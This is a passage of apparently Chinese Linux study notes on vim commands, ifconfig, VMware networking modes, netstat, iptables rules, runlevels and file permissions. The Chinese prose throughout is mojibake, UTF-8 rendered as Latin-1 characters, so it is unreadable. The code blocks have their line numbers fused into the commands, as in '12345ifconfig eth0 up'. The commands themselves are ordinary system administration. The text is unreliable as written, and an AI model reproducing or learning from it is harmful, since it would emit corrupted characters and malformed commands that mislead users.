ä¸Šä¸€è¡Œ/ä¸‹ä¸€è¡Œ o: å°o, å½“å‰è¡Œçš„ä¸‹ä¸€è¡Œæ’å…¥ç©ºè¡Œ O: å¤§o, å½“å‰å†…å®¹ä¸‹ç§»ä¸€è¡Œ, å½“å‰è¡Œæ’å…¥ç©ºè¡Œ å½“å‰è¡Œ åˆ é™¤ dd: åˆ é™¤å½“å‰è¡Œ 3dd: ndd, åˆ é™¤ä»å½“å‰è¡Œå¼€å§‹çš„ nè¡Œ å½“å‰è¡Œ å¤åˆ¶ yy: å¤åˆ¶å…‰æ ‡æ‰€åœ¨è¡Œ 3yy: å¤åˆ¶ä»å½“å‰è¡Œå¼€å§‹çš„3è¡Œ ç²˜è´´ p: ç²˜è´´åˆ°å…‰æ ‡æ‰€åœ¨è¡Œçš„ä¸‹ä¸€è¡Œ æ’¤é”€ u: undo æ’¤é”€æ“ä½œ, å¯ä¸€ç›´æ’¤é”€åˆ°æœ€å‰é¢ é‡ç‚¹æ€»ç»“: i : å½“å‰å…‰æ ‡å‰å¼€å§‹æ’å…¥; a: å…‰æ ‡åä¸€ä½å¼€å§‹æ’å…¥ I: åœ¨è¯¥è¡Œçš„æœ€å‰é¢æ’å…¥; A: åœ¨è¯¥è¡Œçš„æœ€åæ’å…¥ o: å°o, å½“å‰è¡Œçš„ä¸‹ä¸€è¡Œæ’å…¥ç©ºè¡Œ O: å¤§o, å½“å‰å†…å®¹ä¸‹ç§»ä¸€è¡Œ, å½“å‰è¡Œæ’å…¥ç©ºè¡Œ dd: åˆ é™¤å½“å‰è¡Œ 3dd: ndd, åˆ é™¤ä»å½“å‰è¡Œå¼€å§‹çš„ nè¡Œ yy: å¤åˆ¶å…‰æ ‡æ‰€åœ¨è¡Œ 3yy: å¤åˆ¶ä»å½“å‰è¡Œå¼€å§‹çš„3è¡Œ p: ç²˜è´´åˆ°å…‰æ ‡æ‰€åœ¨è¡Œçš„ä¸‹ä¸€è¡Œ u: undo æ’¤é”€æ“ä½œ, å¯ä¸€ç›´æ’¤é”€åˆ°æœ€å‰é¢ 4. æŸ¥æ‰¾å¹¶æ›¿æ¢ åœ¨åº•è¡Œå‘½ä»¤æ¨¡å¼ä¸­è¾“å…¥ 1. æ˜¾ç¤ºè¡Œå· :set nu 2. éšè—è¡Œå· :set nonu 3 .æŸ¥æ‰¾å…³é”®å­— :/you ## æ•ˆæœï¼šæŸ¥æ‰¾æ–‡ä»¶ä¸­å‡ºç°çš„youï¼Œå¹¶å®šä½åˆ°ç¬¬ä¸€ä¸ªæ‰¾åˆ°çš„åœ°æ–¹ï¼ŒæŒ‰ nå¯ä»¥å®šä½åˆ°ä¸‹ä¸€ä¸ªåŒ¹é…ä½ç½®ï¼ˆæŒ‰Nå®šä½åˆ°ä¸Šä¸€ä¸ªï¼‰ æŸ¥è¯¢çš„æ—¶å€™è¢«åŒ¹é…ä¸Šçš„å­—ç¬¦ä¸²ä¼šè¢«é«˜äº®ï¼Œå¯ä»¥åœ¨å‘½ä»¤æ¨¡å¼ä¸‹ä½¿ç”¨:nohå–æ¶ˆé«˜äº® 4. ç›´æ¥è·³è½¬åˆ° 3è¡Œ : 3 5. æ›¿æ¢æ“ä½œ :1 s/sad/bbb å°†ç¬¬ä¸€è¡Œçš„ç¬¬ä¸€ä¸ªsadæ›¿æ¢ä¸ºbbb :1,5 s/sad/bbb å°†ç¬¬ä¸€è¡Œåˆ°ç¬¬äº”è¡Œçš„ç¬¬ä¸€ä¸ªsadæ›¿æ¢ä¸ºbbb :1,. s/sad/bbb å°†ç¬¬ä¸€è¡Œåˆ°å…‰æ ‡è¡Œçš„ç¬¬ä¸€ä¸ªsadæ›¿æ¢ä¸ºbbb :.,$ s/sad/bbb å°†å…‰æ ‡è¡Œåˆ°ç¼“å†²åŒºæœ€åä¸€è¡Œçš„sadæ›¿æ¢ä¸ºbbb :s/sad/bbb æŸ¥æ‰¾å…‰æ ‡æ‰€åœ¨è¡Œçš„ç¬¬ä¸€ä¸ªsadï¼Œæ›¿æ¢ä¸ºbbb :s/sad/bbb/g æŸ¥æ‰¾å…‰æ ‡æ‰€åœ¨è¡Œçš„æ‰€æœ‰sadï¼Œæ›¿æ¢ä¸ºbbb :%s/sad/bbb æŸ¥æ‰¾æ–‡ä»¶ä¸­æ‰€æœ‰è¡Œç¬¬ä¸€æ¬¡å‡ºç°çš„sadï¼Œæ›¿æ¢ä¸ºbbb :%s/sad/bbb/g æŸ¥æ‰¾æ–‡ä»¶ä¸­æ‰€æœ‰çš„sadï¼Œæ›¿æ¢ä¸ºbbb 6. å±å¹•ç¿»æ»šç±»å‘½ä»¤ Ctrl + uï¼šå‘æ–‡ä»¶é¦–ç¿»åŠå± Ctrl + dï¼šå‘æ–‡ä»¶å°¾ç¿»åŠå± Ctrl + fï¼šå‘æ–‡ä»¶å°¾ç¿»ä¸€å± Ctrlï¼‹bï¼šå‘æ–‡ä»¶é¦–ç¿»ä¸€å± nzï¼šå°†ç¬¬nè¡Œæ»šè‡³å±å¹•é¡¶éƒ¨ï¼Œä¸æŒ‡å®šnæ—¶å°†å½“å‰è¡Œæ»šè‡³å±å¹•é¡¶éƒ¨ 7. å…¶å®ƒçš„å°æŠ€å·§ r æ›¿æ¢å…‰æ ‡å¤„ä¸€ä¸ªå­—ç¬¦ R è¿›å…¥æ›¿æ¢æ¨¡å¼ï¼Œä»å…‰æ ‡å¤„è¿ç»­æ›¿æ¢ s åˆ é™¤å½“å‰å­—ç¬¦ï¼Œè¿›å…¥æ’å…¥æ¨¡å¼ S åˆ é™¤å½“å‰è¡Œï¼Œè¿›å…¥æ’å…¥æ¨¡å¼ â‰ˆ dd, ddä¹Ÿä¼šåˆ é™¤å½“å‰è¡Œ, ä½†æ˜¯ä¸ä¼šè¿›å…¥æ’å…¥æ¨¡å¼ f s å…‰æ ‡è¡Œå†…å‘åæŸ¥æ‰¾ç¬¬ä¸€ä¸ªå‡ºç°çš„å­—ç¬¦s (å…ˆè¾“f , å†è¾“ s, å‘åæ‰¾ s) F s å…‰æ ‡è¡Œå†…å‘å‰æŸ¥æ‰¾ç¬¬ä¸€ä¸ªå‡ºç°çš„å­—ç¬¦s (å…ˆè¾“F , å†è¾“ s, å‘å‰æ‰¾ s) ~ å¤§å°å†™è½¬æ¢ï¼Œåªè½¬æ¢å…‰æ ‡å¤„å­—ç¬¦ 8. é€ŸæŸ¥ç½‘å€ vimè¯¦è§£ 2. ç½‘ç»œç®¡ç†ifconfigå‘½ä»¤ifconfigå‘½ä»¤ä¸»è¦ç”¨äºé…ç½®ç½‘ç»œæ¥å£ï¼Œå¦‚æœä¸åŠ ä»»ä½•å‚æ•°ï¼Œåˆ™ifconfigå‘½ä»¤ç”¨äºæŸ¥çœ‹å½“å‰æ‰€æœ‰æ´»åŠ¨ç½‘ç»œæ¥å£çš„çŠ¶æ€ä¿¡æ¯ï¼Œå¦‚ä¸‹å›¾ï¼š eth0 è¡¨ç¤ºç¬¬ä¸€å—ç½‘å¡ï¼Œå…¶ä¸­HWaddrè¡¨ç¤ºç½‘å¡çš„ç‰©ç†åœ°å€ï¼Œå¯ä»¥çœ‹åˆ°ç›®å‰è¿™ä¸ªç½‘å¡çš„ç‰©ç†åœ°å€(MACåœ°å€ï¼‰æ˜¯00:0C:29:D6:C7:0Eã€‚ inet addr ç”¨æ¥è¡¨ç¤ºç½‘å¡çš„IPåœ°å€ï¼Œæ­¤ç½‘å¡çš„IPåœ°å€æ˜¯192.168.179.6ï¼Œå¹¿æ’­åœ°å€192.168.170.255ï¼Œæ©ç åœ°å€Mask:255.255.255.0ã€‚ lo æ˜¯è¡¨ç¤ºä¸»æœºçš„å›ååœ°å€ï¼Œè¿™ä¸ªä¸€èˆ¬æ˜¯ç”¨æ¥æµ‹è¯•ä¸€ä¸ªç½‘ç»œç¨‹åºï¼Œä½†åˆä¸æƒ³è®©å±€åŸŸç½‘æˆ–å¤–ç½‘çš„ç”¨æˆ·èƒ½å¤ŸæŸ¥çœ‹ï¼Œåªèƒ½åœ¨æ­¤å°ä¸»æœºä¸Šè¿è¡Œå’ŒæŸ¥çœ‹æ‰€ç”¨çš„ç½‘ç»œæ¥å£ã€‚æ¯”å¦‚æŠŠ httpdæœåŠ¡å™¨çš„æŒ‡å®šåˆ°å›ååœ°å€ï¼Œåœ¨æµè§ˆå™¨è¾“å…¥127.0.0.1å°±èƒ½çœ‹åˆ°ä½ æ‰€æ¶WEBç½‘ç«™äº†ã€‚ä½†åªæ˜¯æ‚¨èƒ½çœ‹å¾—åˆ°ï¼Œå±€åŸŸç½‘çš„å…¶å®ƒä¸»æœºæˆ–ç”¨æˆ·æ— ä»çŸ¥é“ã€‚ ifconfigå…¶ä»–å¸¸ç”¨ä½¿ç”¨ -a æ˜¾ç¤ºæ‰€æœ‰ç½‘ç»œæ¥å£ï¼ŒåŒ…æ‹¬åœç”¨çš„ -s çŸ­æ ¼å¼æ˜¾ç¤ºç½‘ç»œä¿¡æ¯ï¼ŒåŒnetstat -i -v æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯ï¼Œåœ¨ç½‘ç»œå‡ºé”™çš„æƒ…å†µä¸‹é€‚ç”¨ interface æŒ‡å®šç½‘ç»œæ¥å£ up å¯ç”¨ç½‘ç»œæ¥å£ down å…³é—­ç½‘ç»œæ¥å£ å¯åŠ¨å…³é—­æŒ‡å®šç½‘å¡&amp; å¸¸ç”¨æ“ä½œï¼š 12345ifconfig eth0 up #å¯åŠ¨ç½‘å¡ifconfig eth0 down #å…³é—­ç½‘å¡ ifconfig #å¤„äºæ¿€æ´»çŠ¶æ€çš„ç½‘ç»œæ¥å£ifconfig -a #æ‰€æœ‰é…ç½®çš„ç½‘ç»œæ¥å£ï¼Œä¸è®ºå…¶æ˜¯å¦æ¿€æ´»ifconfig eth0 #æ˜¾ç¤ºeth0çš„ç½‘å¡ä¿¡æ¯ ç½‘ç»œé…ç½®1. ä¸‰ç§é€šä¿¡æ¨¡å¼Vmwareä¸­çš„è™šæ‹Ÿæœºå’Œå®¿ä¸»æœºè¿›è¡Œé€šä¿¡æœ‰ä¸‰ç§ç½‘ç»œæ–¹å¼ ä¸€ã€Brigdeâ€•â€•æ¡¥æ¥ï¼šé»˜è®¤ä½¿ç”¨VMnet0 åŸç†: Bridge æ¡¥â€å°±æ˜¯ä¸€ä¸ªä¸»æœºï¼Œè¿™ä¸ªæœºå™¨æ‹¥æœ‰ä¸¤å—ç½‘å¡ï¼Œåˆ†åˆ«å¤„äºä¸¤ä¸ªå±€åŸŸç½‘ä¸­ï¼ŒåŒæ—¶åœ¨â€æ¡¥â€ä¸Šï¼Œè¿è¡Œç€ç¨‹åºï¼Œè®©å±€åŸŸç½‘Aä¸­çš„æ‰€æœ‰æ•°æ®åŒ…åŸå°ä¸åŠ¨çš„æµå…¥Bï¼Œåä¹‹äº¦ç„¶ã€‚è¿™æ ·ï¼Œå±€åŸŸç½‘Aå’ŒBå°±æ— ç¼çš„åœ¨é“¾è·¯å±‚è¿æ¥èµ·æ¥äº†ï¼Œåœ¨æ¡¥æ¥æ—¶ï¼ŒVMWareç½‘å¡å’Œç‰©ç†ç½‘å¡åº”è¯¥å¤„äºåŒä¸€IPç½‘æ®µ å½“ç„¶è¦ä¿è¯ä¸¤ä¸ªå±€åŸŸç½‘æ²¡æœ‰å†²çªçš„IP. VMWare çš„æ¡¥ä¹Ÿæ˜¯åŒæ ·çš„é“ç†ï¼Œåªä¸è¿‡ï¼Œæœ¬æ¥ä½œä¸ºç¡¬ä»¶çš„ä¸€å—ç½‘å¡ï¼Œç°åœ¨ç”±VMWareè½¯ä»¶è™šæ‹Ÿäº†ï¼å½“é‡‡ç”¨æ¡¥æ¥æ—¶ï¼ŒVMWareä¼šè™šæ‹Ÿä¸€å—ç½‘å¡å’ŒçœŸæ­£çš„ç‰©ç†ç½‘å¡å°±è¡Œæ¡¥æ¥ï¼Œè¿™æ ·ï¼Œå‘åˆ°ç‰©ç†ç½‘å¡çš„æ‰€æœ‰æ•°æ®åŒ…å°±åˆ°äº†VMWareè™šæ‹Ÿæœºï¼Œè€Œç”±VMWareå‘å‡ºçš„æ•°æ®åŒ…ä¹Ÿä¼šé€šè¿‡æ¡¥ä»ç‰©ç†ç½‘å¡çš„é‚£ç«¯å‘å‡ºã€‚ æ‰€ä»¥ï¼Œå¦‚æœç‰©ç†ç½‘å¡å¯ä»¥ä¸Šç½‘ï¼Œé‚£ä¹ˆæ¡¥æ¥çš„è½¯ç½‘å¡ä¹Ÿæ²¡æœ‰é—®é¢˜äº†ï¼Œè¿™å°±æ˜¯æ¡¥æ¥ä¸Šç½‘çš„åŸç†äº†ã€‚ è”ç½‘æ–¹å¼ï¼š è¿™ä¸€ç§è”ç½‘æ–¹å¼æœ€ç®€å•ï¼Œåœ¨å±€åŸŸç½‘å†…ï¼Œä½ çš„ä¸»æœºæ˜¯æ€ä¹ˆè”ç½‘çš„ï¼Œä½ åœ¨è™šæ‹Ÿæœºé‡Œå°±æ€ä¹ˆè¿ç½‘ã€‚æŠŠè™šæ‹Ÿæœºçœ‹æˆå±€åŸŸç½‘å†…çš„å¦ä¸€å°ç”µè„‘å°±è¡Œäº†ï¼ æç¤ºï¼šä¸»æœºç½‘å¡å¤„åœ¨ä¸€ä¸ªå¯ä»¥è®¿é—®Internetçš„å±€åŸŸç½‘ä¸­ï¼Œè™šæ‹Ÿæœºæ‰èƒ½é€šè¿‡Bridgeè®¿é—®Internetã€‚ äºŒã€NATâ€•â€•ç½‘ç»œåœ°å€è½¬æ¢ ï¼šé»˜è®¤ä½¿ç”¨VMnet8 åŸç†ï¼š NAT æ˜¯ Network address translateçš„ç®€ç§°ã€‚NATæŠ€æœ¯åº”ç”¨åœ¨internetç½‘å…³å’Œè·¯ç”±å™¨ä¸Šï¼Œæ¯”å¦‚192.168.0.123è¿™ä¸ªåœ°å€è¦è®¿é—®internetï¼Œå®ƒçš„æ•°æ®åŒ…å°±è¦é€šè¿‡ä¸€ä¸ªç½‘å…³æˆ–è€…è·¯ç”±å™¨ï¼Œè€Œç½‘å…³æˆ–è€…è·¯ç”±å™¨æ‹¥æœ‰ä¸€ä¸ªèƒ½è®¿é—®internetçš„ipåœ°å€ï¼Œè¿™æ ·çš„ç½‘å…³å’Œè·¯ç”±å™¨å°±è¦åœ¨æ”¶å‘æ•°æ®åŒ…æ—¶ï¼Œå¯¹æ•°æ®åŒ…çš„IPåè®®å±‚æ•°æ®è¿›è¡Œæ›´æ”¹ï¼ˆå³ NATï¼‰ï¼Œä»¥ä½¿ç§æœ‰ç½‘æ®µçš„ä¸»æœºèƒ½å¤Ÿé¡ºåˆ©è®¿é—®internetã€‚æ­¤æŠ€æœ¯è§£å†³äº†IPåœ°å€ç¨€ç¼ºçš„é—®é¢˜ã€‚åŒæ ·çš„ç§æœ‰IPå¯ä»¥ç½‘å…³NAT ä¸Šç½‘ã€‚ VMWareçš„NATä¸Šç½‘ä¹Ÿæ˜¯åŒæ ·çš„é“ç†ï¼Œå®ƒåœ¨ä¸»æœºå’Œè™šæ‹Ÿæœºä¹‹é—´ç”¨è½¯ä»¶ä¼ªé€ å‡ºä¸€å—ç½‘å¡ï¼Œè¿™å—ç½‘å¡å’Œè™šæ‹Ÿæœºçš„ipå¤„äºä¸€ä¸ªåœ°å€æ®µã€‚åŒæ—¶ï¼Œåœ¨è¿™å—ç½‘å¡å’Œä¸»æœºçš„ç½‘ç»œæ¥å£ä¹‹é—´è¿›è¡ŒNATã€‚è™šæ‹Ÿæœºå‘å‡ºçš„æ¯ä¸€å—æ•°æ®åŒ…éƒ½ä¼šç»è¿‡è™šæ‹Ÿç½‘å¡ï¼Œç„¶åNATï¼Œç„¶åç”±ä¸»æœºçš„æ¥å£å‘å‡ºã€‚ è™šæ‹Ÿç½‘å¡å’Œè™šæ‹Ÿæœºå¤„äºä¸€ä¸ªåœ°å€æ®µï¼Œè™šæ‹Ÿæœºå’Œä¸»æœºä¸åŒä¸€ä¸ªåœ°å€æ®µï¼Œä¸»æœºç›¸å½“äºè™šæ‹Ÿæœºçš„ç½‘å…³ï¼Œæ‰€ä»¥è™šæ‹Ÿæœºèƒ½pingåˆ°ä¸»æœºçš„IPï¼Œä½†æ˜¯ä¸»æœºpingä¸åˆ°è™šæ‹Ÿæœºçš„IPã€‚ è”ç½‘æ–¹å¼ï¼š æ–¹æ³•1ã€åŠ¨æ€IPåœ°å€ã€‚ ä¸»æœºæ˜¯é™æ€IPæˆ–åŠ¨æ€IPï¼Œéƒ½æ— æ‰€è°“ï¼Œå°†è™šæ‹Ÿæœºè®¾ç½®æˆä½¿ç”¨DHCPæ–¹å¼ä¸Šç½‘,Windowsä¸‹é€‰æ‹©â€œè‡ªåŠ¨è·å–IPâ€œï¼Œlinuxä¸‹å¼€å¯DHCPæœåŠ¡å³å¯ã€‚ï¼ˆè¿™ç§æ–¹æ³•æœ€ç®€å•ï¼Œä¸ç”¨è¿‡å¤šçš„è®¾ç½®ï¼Œä½†è¦åœ¨VMwareä¸­è¿›è¡Œâ€œç¼–è¾‘â†’è™šæ‹Ÿç½‘ç»œè®¾ç½®â€ï¼Œå°†NATå’ŒDHCPéƒ½å¼€å¯äº†ã€‚ä¸€èˆ¬NATé»˜è®¤å¼€å¯ï¼ŒDHCPé»˜è®¤å…³é—­ï¼‰ æ–¹æ³•2ã€é™æ€IPåœ°å€ã€‚ å¦‚æœä¸æƒ³ä½¿ç”¨DHCPï¼Œä¹Ÿå¯ä»¥æ‰‹åŠ¨è®¾ç½®ï¼š IPè®¾ç½®ä¸vmnet1åŒç½‘æ®µ,ç½‘å…³è®¾ç½®æˆvmnet8çš„ç½‘å…³ï¼ˆåœ¨â€œè™šæ‹Ÿç½‘ç»œè®¾ç½®â€é‡Œçš„Neté€‰é¡¹å¡é‡Œèƒ½æ‰¾åˆ°Gatewayï¼‰é€šå¸¸æ˜¯xxx.xxx.xxx.2ã€‚å­ç½‘æ©ç è®¾ç½®ä¸VMnet8ç›¸åŒï¼ˆè®¾ç½®å¥½IPåœ°å€åï¼Œå­ç½‘æ©ç è‡ªåŠ¨ç”Ÿæˆï¼‰DNSè®¾ç½®ä¸ä¸»æœºç›¸åŒã€‚ ä¾‹å¦‚ï¼šä¸»æœºIPæ˜¯10.70.54.31,è®¾ç½®è™šæ‹ŸæœºIPä¸º10.70.54.22ã€‚Netmask,Gateway,DNSéƒ½ä¸ä¸»æœºç›¸åŒå³å¯å®ç° è™šæ‹Ÿæœº â€”ä¸»æœº è™šæ‹Ÿæœºäº’è”ç½‘ é€šä¿¡ã€‚ æç¤ºï¼šä½¿ç”¨NATæŠ€æœ¯ï¼Œä¸»æœºèƒ½ä¸Šç½‘ï¼Œè™šæ‹Ÿæœºå°±å¯ä»¥è®¿é—®Internetï¼Œä½†æ˜¯ä¸»æœºä¸èƒ½è®¿é—®è™šæ‹Ÿæœºã€‚ ä¸‰ã€Host-Onlyâ€•â€•ç§æœ‰ç½‘ç»œå…±äº«ä¸»æœºï¼šé»˜è®¤ä½¿ç”¨VMnet1 è”ç½‘æ–¹æ³•ï¼š æ–¹æ³•1ã€åŠ¨æ€IPåœ°å€ã€‚åƒä¸Šé¢é‚£æ ·å¼€å¯DHCPåï¼Œè™šæ‹Ÿæœºç›´æ¥è‡ªåŠ¨è·å–IPåœ°å€å’ŒDNSã€‚å°±å¯ä»¥å’Œä¸»æœºç›¸è¿äº†ã€‚å½“ç„¶ï¼Œè¿˜è¦è¿›è¡Œä¸€äº›å±€åŸŸç½‘å…±äº«çš„æ“ä½œï¼Œè¿™é‡Œä¸å†èµ˜è¿°ã€‚ æ–¹æ³•2ã€é™æ€IPåœ°å€ã€‚ ä¹Ÿå¯ä»¥æ‰‹åŠ¨è®¾ç½®ï¼Œå°†è™šæ‹ŸæœºIPè®¾ç½®ä¸VMnet1åŒç½‘æ®µ,ç½‘å…³è®¾ç½®æˆVMnet1çš„ç½‘å…³ç›¸åŒ,å…¶ä½™è®¾ç½®ä¸VMnet1ç›¸åŒ,DNSè®¾ç½®ä¸ä¸»æœºç›¸åŒã€‚ ä¾‹å¦‚ï¼šVMnet1 IP:172.16.249.1 Gateway :172.16.249.2 é‚£ä¹ˆè™šæ‹Ÿæœº IP:172.16.249.100 Gateway: 172.16.249.2 è¿™æ ·ã€ è™šæ‹Ÿæœºä¸»æœº å¯ä»¥é€šä¿¡ä½†æ˜¯ã€ è™šæ‹Ÿæœºäº’è”ç½‘ æ— æ³•é€šä¿¡ æç¤ºï¼šHost-onlyæŠ€æœ¯åªç”¨äºä¸»æœºå’Œè™šæ‹Ÿæœºäº’è®¿ï¼Œäºè®¿é—®internetæ— å…³ã€‚ 2. NATç½‘ç»œæ¨¡å¼çš„é…ç½®è§Linuxå­¦ä¹ ç¬”è®°3, ç¬¬8æ¡: Linuxè™šæ‹Ÿä¸»æœºé›†ç¾¤æµ‹è¯•ç¯å¢ƒåŸºæœ¬æ­å»º 3. å…¶å®ƒçš„å¸¸ç”¨ç½‘ç»œç®¡ç†å‘½ä»¤ pingå‘½ä»¤: å¸¸ç”¨æ¥æµ‹è¯•ç½‘ç»œè¿æ¥æ˜¯å¦æ­£å¸¸ å…ˆç¡®å®šèƒ½pingé€š ping www.baidu.com hostå‘½ä»¤: hostå‘½ä»¤ç”¨æ¥è¿›è¡ŒDNSæŸ¥è¯¢ ç„¶åç”¨hostå‘½ä»¤å¯ä»¥æŸ¥çœ‹åˆ° host www.baidu.com ç„¶åé€šè¿‡æµè§ˆå™¨è®¿é—®è¯¥åœ°å€ï¼š119.75.213.61 netstatå‘½ä»¤: netstatå‘½ä»¤å¯ä»¥æ˜¾ç¤ºç½‘ç»œæ¥å£çš„å¾ˆå¤šç»Ÿè®¡ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ‰“å¼€çš„socketå’Œè·¯ç”±è¡¨ ä»¥ä¸‹æ˜¯å¸¸ç”¨å‘½ä»¤é€‰é¡¹ 123456789101112-a (all)æ˜¾ç¤ºæ‰€æœ‰é€‰é¡¹ï¼Œé»˜è®¤ä¸æ˜¾ç¤ºLISTENç›¸å…³-t (tcp)ä»…æ˜¾ç¤ºtcpç›¸å…³é€‰é¡¹-u (udp)ä»…æ˜¾ç¤ºudpç›¸å…³é€‰é¡¹-n æ‹’ç»æ˜¾ç¤ºåˆ«åï¼Œèƒ½æ˜¾ç¤ºæ•°å­—çš„å…¨éƒ¨è½¬åŒ–æˆæ•°å­—-l ä»…åˆ—å‡ºæœ‰åœ¨ Listen (ç›‘å¬) çš„æœå‹™çŠ¶æ€-p æ˜¾ç¤ºå»ºç«‹ç›¸å…³é“¾æ¥çš„ç¨‹åºå-r æ˜¾ç¤ºè·¯ç”±ä¿¡æ¯ï¼Œè·¯ç”±è¡¨-e æ˜¾ç¤ºæ‰©å±•ä¿¡æ¯ï¼Œä¾‹å¦‚uidç­‰-s æŒ‰å„ä¸ªåè®®è¿›è¡Œç»Ÿè®¡-c æ¯éš”ä¸€ä¸ªå›ºå®šæ—¶é—´ï¼Œæ‰§è¡Œè¯¥netstatå‘½ä»¤ ä¾‹å­ 1ã€åˆ—å‡ºæ‰€æœ‰ç«¯å£ï¼ŒåŒ…æ‹¬ç›‘å¬å’Œæœªç›‘å¬çš„ï¼šnetstat -a 2ã€åˆ—å‡ºæ‰€æœ‰TCPç«¯å£ï¼šnetstat -at 3ã€åˆ—å‡ºæ‰€æœ‰UDPç«¯å£ï¼šnetstat -au 4ã€åˆ—å‡ºæ‰€æœ‰ç›‘å¬çŠ¶æ€çš„TCPç«¯å£ï¼šè¯¥å‘½ä»¤æœ€é‡è¦ç”¨æ¥æŸ¥çœ‹å“ªä¸ªç¨‹åºå ç”¨äº†å“ªä¸ªç½‘ç»œç«¯å£å· 123# æ¯”å¦‚æŸ¥çœ‹è°å ç”¨äº† tcp çš„80 ç«¯å£netstat -nltp | grep 80 [23:04:54]tcp 0 0 :::80 :::* LISTEN 3890/httpd 4. é˜²ç«å¢™é˜²ç«å¢™æ ¹æ®é…ç½®æ–‡ä»¶/etc/sysconfig/iptablesæ¥æ§åˆ¶æœ¬æœºçš„â€œå‡ºã€å…¥â€ç½‘ç»œè®¿é—®è¡Œä¸º å…¶å¯¹è¡Œä¸ºçš„é…ç½®ç­–ç•¥æœ‰å››ä¸ªç­–ç•¥è¡¨ åŸºç¡€å¿…å¤‡æŠ€èƒ½ | æŸ¥çœ‹é˜²ç«å¢™çŠ¶æ€ | service iptables status || â€”â€”â€”â€”â€”â€”â€”- | â€”â€”â€”â€”â€”â€”â€”â€”â€”â€“ || å¼€å¯é˜²ç«å¢™ | service iptables start || å…³é—­é˜²ç«å¢™ | service iptables stop || å…³é—­é˜²ç«å¢™å¼€æœºè‡ªå¯ | chkconfig iptables off || è®¾ç½®é˜²ç«å¢™å¼€æœºè‡ªå¯ | chkconfig iptables on || æŸ¥çœ‹é˜²ç«å¢™å¼€æœºå¯åŠ¨çŠ¶æ€ | chkconfig iptables â€“list | æ‰©å±•çŸ¥è¯† 1234567891011121314151617181920212223242526# 1ã€åˆ—å‡ºiptablesè§„åˆ™iptables -L -n# åˆ—å‡ºiptablesè§„åˆ™å¹¶æ˜¾ç¤ºè§„åˆ™ç¼–å·iptables -L -n --line-numbers# 2ã€åˆ—å‡ºiptables natè¡¨è§„åˆ™ï¼ˆé»˜è®¤æ˜¯filterè¡¨ï¼‰iptables -L -n -t nat# 3ã€æ¸…é™¤é»˜è®¤è§„åˆ™ï¼ˆæ³¨æ„é»˜è®¤æ˜¯filterè¡¨ï¼Œå¦‚æœå¯¹natè¡¨æ“ä½œè¦åŠ -t natï¼‰#æ¸…é™¤æ‰€æœ‰è§„åˆ™iptables -F#é‡å¯iptableså‘ç°è§„åˆ™ä¾ç„¶å­˜åœ¨ï¼Œå› ä¸ºæ²¡æœ‰ä¿å­˜service iptables restart#ä¿å­˜é…ç½®service iptables save# 4ã€ç¦æ­¢SSHç™»é™†ï¼ˆå¦‚æœæœåŠ¡å™¨åœ¨æœºæˆ¿ï¼Œä¸€å®šè¦å°å¿ƒï¼‰iptables -A INPUT -p tcp --dport 22 -j DROP# 5ã€åˆ é™¤è§„åˆ™iptables -D INPUT -p tcp --dport 22 -j DROP # 6ã€åŠ å…¥ä¸€æ¡INPUTè§„åˆ™å¼€æ”¾80ç«¯å£ iptables -I INPUT -p tcp --dport 80 -j ACCEPT 3. Linuxç³»ç»Ÿå¯åŠ¨çº§åˆ«ç®¡ç†ä½¿ç”¨runlevelå‘½ä»¤å¯ä»¥æŸ¥çœ‹ç³»ç»Ÿè¿è¡Œçš„çº§åˆ« 12runlevel [23:12:37]N 3 ä¿®æ”¹ç³»ç»Ÿé»˜è®¤å¯åŠ¨çº§åˆ« 1234567891011121314# å¯åŠ¨çº§åˆ«åœ¨è¿™ä¸ªè·¯å¾„æŸ¥çœ‹vi /etc/inittab-------------------# Default runlevel. The runlevels used are:# 0 - halt (Do NOT set initdefault to this)# 1 - Single user mode# 2 - Multiuser, without NFS (The same as 3, if you do not have networking)# 3 - Full multiuser mode# 4 - unused# 5 - X11# 6 - reboot (Do NOT set initdefault to this)#id:3:initdefault: id:3:initdefault: ## é…ç½®é»˜è®¤å¯åŠ¨çº§åˆ« ## é€šå¸¸å°†é»˜è®¤å¯åŠ¨çº§åˆ«è®¾ç½®ä¸ºï¼š3 4. ç”¨æˆ·å’Œç»„1. ç”¨æˆ·å’Œç»„çš„æ¦‚å¿µLinuxæ˜¯ä¸€ä¸ªå¤šä»»åŠ¡å¤šç”¨æˆ·çš„æ“ä½œç³»ç»Ÿï¼Œå½“æˆ‘ä»¬åœ¨ä½¿ç”¨ls -lå‘½ä»¤çš„æ—¶å€™æˆ‘ä»¬çœ‹åˆ°å¦‚ä¸‹ä¿¡æ¯ï¼š 123drwxrwxr-x. 2 root root 4096 5æœˆ 24 00:15 test-rw-r--r--. 1 root root 58 5æœˆ 25 11:00 test.sh-rwxr-xr-x. 1 root root 35 5æœˆ 23 23:55 test.txt testï¼šè¡¨ç¤ºæ–‡ä»¶æˆ–è€…ç›®å½•ï¼Œå…·ä½“çš„æ–‡ä»¶ç±»å‹æ˜¯ç”±è¯¥è¡Œæœ€å‰é¢çš„é‚£ä¸ªç¬¦å·è¡¨ç¤º 12345- å½“ä¸º[ *d* ]åˆ™æ˜¯ç›®å½•- å½“ä¸º[ *-* ]åˆ™æ˜¯æ–‡ä»¶ï¼›- è‹¥æ˜¯[ *l* ]åˆ™è¡¨ç¤ºä¸ºé“¾æ¥æ–‡æ¡£(link file)ï¼›- è‹¥æ˜¯[ *b* ]åˆ™è¡¨ç¤ºä¸ºè£…ç½®æ–‡ä»¶é‡Œé¢çš„å¯ä¾›å‚¨å­˜çš„æ¥å£è®¾å¤‡(å¯éšæœºå­˜å–è£…ç½®)ï¼›- è‹¥æ˜¯[ *c* ]åˆ™è¡¨ç¤ºä¸ºè£…ç½®æ–‡ä»¶é‡Œé¢çš„ä¸²è¡Œç«¯å£è®¾å¤‡ï¼Œä¾‹å¦‚é”®ç›˜ã€é¼ æ ‡(ä¸€æ¬¡æ€§è¯»å–è£…ç½®); drwxrwxr-x ï¼šè¯¥æ–‡ä»¶çš„ç±»å‹å’Œæƒé™ä¿¡æ¯ 2 ï¼šé“¾æ¥æ•°ï¼Œå¦‚æœæ˜¯æ–‡ä»¶åˆ™æ˜¯1 ï¼Œ å¦‚æœæ˜¯æ–‡ä»¶å¤¹åˆ™è¡¨ç¤ºè¯¥æ–‡ä»¶å¤¹ä¸‹çš„å­æ–‡ä»¶å¤¹ä¸ªæ•° ç¬¬ä¸€ä¸ªroot ï¼šæ–‡ä»¶æˆ–è€…ç›®å½•çš„æ‰€å±è€…** 